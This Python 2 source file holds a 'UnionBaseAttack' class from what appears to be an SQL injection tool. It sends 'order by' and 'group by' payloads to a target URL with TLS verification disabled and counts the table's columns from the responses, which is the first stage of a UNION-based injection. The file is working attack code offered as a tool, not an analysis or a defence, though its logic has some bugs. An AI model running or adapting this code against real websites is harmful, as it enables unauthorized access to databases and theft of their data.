# -*- coding: utf-8 -*-
'''
    This file contain union exploit class
'''
try:
    from src.Colors import TextColor
    from injection_defines import *
    import requests as reqs
    import sys
    from time import sleep
    from Config.WebConfig import (define_headerdata)
    reload(sys)
    sys.setdefaultencoding('utf-8')

except Exception as err:
    raise SystemExit, TextColor.RED + str("something is wrong " + err) + TextColor.WHITE

class UnionBaseAttack(object):

    def __init__(self, url, injectedChar, firstResponse):
        self.url = url
        self.injectedChar = injectedChar
        self.firstResponse = firstResponse

        self.__start_attack__()

    def __start_attack__(self):
        #First we extract how many columns is exists
        self.__order_by_cmd__()

    def __order_by_cmd__(self):
        injected_method = ""
        end_sharp = ""

        def item_error_checker(response):
            return_r = False
            for item in define_error_order_by_php:
                if response.find(item) is not -1 or \
                        response != self.firstResponse.content:
                    return_r = True
            return return_r

        def get_columns_number(method, end_sharp, ):
            for counter in xrange(1, 1000):
                sleep(1)
                if end_sharp != "":
                    secondResponse = reqs.get(self.url + method + str(counter),
                                              headers=define_headerdata, verify=False)
                else:
                    secondResponse = reqs.get(self.url + method + str(counter) + " %23",
                                              headers=define_headerdata, verify=False)

                if secondResponse.content != self.firstResponse.content:
                    return counter - 1


        for item in define_order_by_command_php:
            sleep(.5)
            secondResponse = reqs.get(url=self.url + str(item), headers=define_headerdata, verify=False)
            if item_error_checker(secondResponse.content):
                '''now we can find which command is used for injection'''
                injected_method = item[0: 10] # it can be ['order by', 'group by']
                if item[-1] == "3":
                     end_sharp = "%23"
                break

        print TextColor.CVIOLET + str("\nWorking on count of columns ... please wait untill I found them") + TextColor.WHITE

        print
        print get_columns_number(injected_method, end_sharp)

